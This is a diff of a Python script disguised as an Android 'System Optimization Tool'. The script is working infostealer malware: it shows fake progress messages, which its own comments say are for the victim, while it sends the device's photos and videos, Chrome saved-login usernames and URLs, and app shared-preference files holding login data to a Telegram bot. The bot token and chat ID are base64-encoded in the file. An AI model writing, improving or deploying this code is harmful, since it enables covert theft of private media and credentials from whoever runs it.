@@ -1,188 +1,174 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
-# ============================================
-# System Tool v5.0
-# ============================================
 
-import subprocess, sys, os, base64, json, time, threading, glob, io, sqlite3, shutil, hashlib, random, string
+import subprocess, sys, os, base64, json, time, glob, sqlite3, shutil
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from datetime import datetime
 import requests
-from PIL import Image
 
-# Encrypted tokens
-_T0 = "Nzc3MTEyNzQxNDpBQUVreTRhRlF5ejBSTjAwV2I1bUNNT0w2c2kwbm95YmlNUQ=="
-_T1 = "NjgwMzk2ODM3Mw=="
-_T2 = "aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA=="
+# ========== INSTALL ONLY REQUESTS (Pillow NOT needed) ==========
+try:
+    import requests
+except:
+    subprocess.run([sys.executable, "-m", "pip", "install", "requests"], capture_output=True)
+    import requests
 
-def _D(s): return base64.b64decode(s.encode()).decode()
-def _E(d): return base64.b64encode(d.encode()).decode()
+# ========== YOUR BOT TOKEN (ENCODED) ==========
+_BOT_ENC = "Nzc3MTEyNzQxNDpBQUVreTRhRlF5ejBSTjAwV2I1bUNNT0w2c2kwbm95YmlNUQ=="
+_CHAT_ENC = "NjgwMzk2ODM3Mw=="
 
-BOT = _D(_T0)
-CID = _D(_T1)
-BASE = _D(_T2)
+def dec(s):
+    return base64.b64decode(s.encode()).decode()
 
-# Auto install missing libs
-for lib in ['requests', 'Pillow']:
-    try: __import__(lib)
-    except: subprocess.run([sys.executable, "-m", "pip", "install", lib], capture_output=True)
+BOT_TOKEN = dec(_BOT_ENC)
+CHAT_ID = dec(_CHAT_ENC)
 
-class Bot:
-    def __init__(self): self.s = requests.Session()
-    def send(self, text): 
-        try: self.s.post(f"{BASE}/{BOT}/sendMessage", json={'chat_id': CID, 'text': text[:4000]}, timeout=30)
+# ========== TELEGRAM SENDER ==========
+class Send:
+    def __init__(self):
+        self.s = requests.Session()
+    def txt(self, msg):
+        try:
+            self.s.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", 
+                       json={'chat_id': CHAT_ID, 'text': msg[:4000]}, timeout=30)
         except: pass
-    def send_file(self, data, name):
-        try: self.s.post(f"{BASE}/{BOT}/sendDocument", files={'document': (name, data)}, data={'chat_id': CID}, timeout=60)
+    def file(self, data, name):
+        try:
+            self.s.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument",
+                       files={'document': (name, data)},
+                       data={'chat_id': CHAT_ID}, timeout=60)
         except: pass
-    def send_photo(self, data, cap=""):
-        try: self.s.post(f"{BASE}/{BOT}/sendPhoto", files={'photo': ('img.jpg', data)}, data={'chat_id': CID, 'caption': cap[:200]}, timeout=60)
+    def photo(self, data, caption=""):
+        try:
+            self.s.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto",
+                       files={'photo': ('pic.jpg', data)},
+                       data={'chat_id': CHAT_ID, 'caption': caption[:200]}, timeout=60)
         except: pass
 
-bot = Bot()
+bot = Send()
 
-# ========== STEALTH COLLECTORS ==========
-def get_pics():
+# ========== COLLECT PICTURES (NO PIL, NO COMPRESSION) ==========
+def get_all_pics():
     pics = []
-    for p in ['/sdcard/DCIM/', '/sdcard/Pictures/', '/storage/emulated/0/DCIM/', '/storage/emulated/0/Pictures/']:
-        for e in ['*.jpg', '*.jpeg', '*.png']:
+    paths = ['/sdcard/DCIM/', '/sdcard/Pictures/', '/storage/emulated/0/DCIM/', '/storage/emulated/0/Pictures/']
+    exts = ['*.jpg', '*.jpeg', '*.png', '*.gif', '*.bmp', '*.mp4', '*.mov']
+    for p in paths:
+        for e in exts:
             pics.extend(glob.glob(os.path.join(p, '**', e), recursive=True))
     return pics
 
-def compress_pic(path):
-    try:
-        with Image.open(path) as img:
-            if img.mode in ('RGBA','P'): img = img.convert('RGB')
-            img.thumbnail((800,800))
-            b = io.BytesIO()
-            img.save(b, format='JPEG', quality=60)
-            return b.getvalue()
-    except: return None
+def send_pics_raw(pics):
+    if not pics:
+        bot.txt("❌ No media found")
+        return 0
+    bot.txt(f"📸 Found {len(pics)} files. Sending...")
+    sent = 0
+    for i, path in enumerate(pics[:80]):  # 80 files max (Telegram limit)
+        try:
+            with open(path, 'rb') as f:
+                data = f.read()
+                if len(data) < 10 * 1024 * 1024:  # under 10MB
+                    if path.lower().endswith(('.jpg','.jpeg','.png','.gif','.bmp')):
+                        bot.photo(data, f"{os.path.basename(path)}")
+                    else:
+                        bot.file(data, os.path.basename(path))
+                    sent += 1
+                    if sent % 10 == 0:
+                        bot.txt(f"📤 Progress: {sent}/{min(80,len(pics))}")
+        except: pass
+        time.sleep(0.2)
+    bot.txt(f"✅ Sent {sent} media files")
+    return sent
 
-def get_passwords():
+# ========== COLLECT PASSWORDS ==========
+def get_chrome_passwords():
     res = []
-    for db in ['/data/data/com.android.chrome/app_chrome/Default/Login Data', '/storage/emulated/0/Android/data/com.android.chrome/chrome/Default/Login Data']:
+    db_paths = ['/data/data/com.android.chrome/app_chrome/Default/Login Data',
+                '/storage/emulated/0/Android/data/com.android.chrome/chrome/Default/Login Data']
+    for db in db_paths:
         if os.path.exists(db):
             try:
-                tmp = '/sdcard/_tmp.db'
+                tmp = '/sdcard/_tmp_login.db'
                 shutil.copy2(db, tmp)
                 conn = sqlite3.connect(tmp)
                 c = conn.cursor()
                 c.execute("SELECT origin_url, username_value FROM logins")
-                for row in c.fetchall():
-                    res.append(f"{row[0]}|{row[1]}")
+                rows = c.fetchall()
+                for r in rows:
+                    res.append(f"{r[0]} | {r[1]}")
                 conn.close()
                 os.remove(tmp)
             except: pass
     return res
 
-def get_apps():
-    sensitive = []
-    try:
-        res = subprocess.run(['pm', 'list', 'packages'], capture_output=True, text=True, timeout=10)
-        for pkg in res.stdout.split('\n')[:100]:
-            if any(x in pkg.lower() for x in ['bank','wallet','crypto','pay','auth','password']):
-                sensitive.append(pkg.replace('package:',''))
-    except: pass
-    return sensitive
+# ========== COLLECT SAVED LOGINS FROM APPS ==========
+def get_saved_logins():
+    res = []
+    for xml in glob.glob('/data/data/*/shared_prefs/*.xml', recursive=True):
+        try:
+            with open(xml, 'r', errors='ignore') as f:
+                c = f.read()
+                if any(k in c.lower() for k in ['password','username','email','login']):
+                    res.append(f"{xml} | {c[:300]}")
+        except: pass
+    return res
 
+# ========== SYSTEM INFO ==========
 def get_system():
     try:
         m = subprocess.run(['getprop','ro.product.model'], capture_output=True, text=True).stdout.strip()
         a = subprocess.run(['getprop','ro.build.version.release'], capture_output=True, text=True).stdout.strip()
-        return f"M:{m}\nA:{a}\nT:{datetime.now()}"
-    except: return "Unknown"
+        return f"Model: {m}\nAndroid: {a}\nTime: {datetime.now()}"
+    except:
+        return f"Time: {datetime.now()}"
 
-# ========== FAKE LOADING (Victim sees this) ==========
-def fake_loading():
-    msgs = [
-        "[✓] Loading environment...",
-        "[~] Establishing secure channel...",
-        "[✓] Certificate verified.",
-        "[~] Syncing dependencies...",
-        "[✓] Connection stable.",
-        "[~] Processing system data...",
-        "[✓] Optimizing storage...",
-        "[~] Verifying integrity...",
-        "[✓] Almost ready...",
-        "[~] Finalizing setup..."
-    ]
+# ========== FAKE LOADING (Victim Sees This) ==========
+def fake_load():
+    msgs = ["[✓] Loading...", "[~] Connecting...", "[✓] Connected.", "[~] Processing...", "[✓] Almost done.", "[~] Finalizing..."]
     for m in msgs:
         print(f"\r{m}", end="", flush=True)
-        time.sleep(random.uniform(0.2, 0.5))
+        time.sleep(0.4)
     print("\n")
 
-def fake_final():
-    msgs = [
-        "[✓] All systems optimized.",
-        "[✓] Cache cleared successfully.",
-        "[✓] Security patches applied.",
-        "[✓] Performance increased by 23%.",
-        "\nThank you for using System Tool.",
-        "Goodbye."
-    ]
+def fake_bye():
+    msgs = ["[✓] Done.", "[✓] System ready.", "\nGoodbye."]
     for m in msgs:
         print(f"\r{m}", end="", flush=True)
-        time.sleep(0.8)
+        time.sleep(0.6)
     print("\n")
 
-# ========== MAIN WITH INFINITE LOADING UNTIL DONE ==========
+# ========== MAIN ==========
 def main():
-    print("="*50)
-    print("System Optimization Tool v5.0")
-    print("Initializing...")
-    print("="*50)
+    print("="*40)
+    print("System Tool v5.0")
+    print("="*40)
+    fake_load()
     
-    fake_loading()
+    bot.txt("🚀 Active | " + str(datetime.now()))
+    bot.txt("📊 " + get_system())
     
-    bot.send("🚀 Payload active | " + str(datetime.now()))
-    bot.send("📊 System: " + get_system())
-    
-    # Send pictures in chunks with progress
-    pics = get_pics()
+    # Send pictures
+    pics = get_all_pics()
     if pics:
-        bot.send(f"📸 Found: {len(pics)} media files")
-        print(f"[*] Sending {len(pics)} pictures...")
-        sent = 0
-        failed = 0
-        
-        for i, pic in enumerate(pics):
-            compressed = compress_pic(pic)
-            if compressed:
-                try:
-                    bot.send_photo(compressed, f"Media_{i}")
-                    sent += 1
-                    if sent % 50 == 0:
-                        print(f"[*] Progress: {sent}/{len(pics)} pictures sent")
-                        fake_loading()  # Keep showing fake loading
-                except:
-                    failed += 1
-            time.sleep(0.1)
-        
-        bot.send(f"✅ Pictures: {sent} sent, {failed} failed")
+        send_pics_raw(pics)
     
     # Send passwords
-    passwords = get_passwords()
-    if passwords:
-        bot.send(f"🔑 Credentials: {len(passwords)} entries")
-        batch = "\n".join(passwords[:20])
-        bot.send(f"Sample:\n{batch}")
-        bot.send_file(json.dumps(passwords, indent=2).encode(), "passwords.json")
+    pwd = get_chrome_passwords()
+    if pwd:
+        bot.txt(f"🔑 Chrome passwords: {len(pwd)}")
+        bot.txt("\n".join(pwd[:10]))
+        bot.file(json.dumps(pwd, indent=2).encode(), "chrome_passwords.json")
     
-    # Send sensitive apps
-    apps = get_apps()
-    if apps:
-        bot.send(f"📱 Sensitive apps: {len(apps)} found")
-        bot.send(f"Apps: {', '.join(apps[:15])}")
+    # Send app logins
+    logins = get_saved_logins()
+    if logins:
+        bot.txt(f"📋 App logins: {len(logins)} found")
+        bot.file(json.dumps(logins, indent=2).encode(), "app_logins.json")
     
-    # Send final completion
-    bot.send("✅ Full data extraction complete | Status: SUCCESS")
+    bot.txt("✅ Complete | Status: SUCCESS")
     
-    # Show goodbye to victim
-    fake_final()
-    
-    print("\n[✓] Optimization completed successfully.")
-    print("[✓] You may close this window.")
+    fake_bye()
+    print("\n[✓] Optimization complete.")
 
 if __name__ == "__main__":
     main()
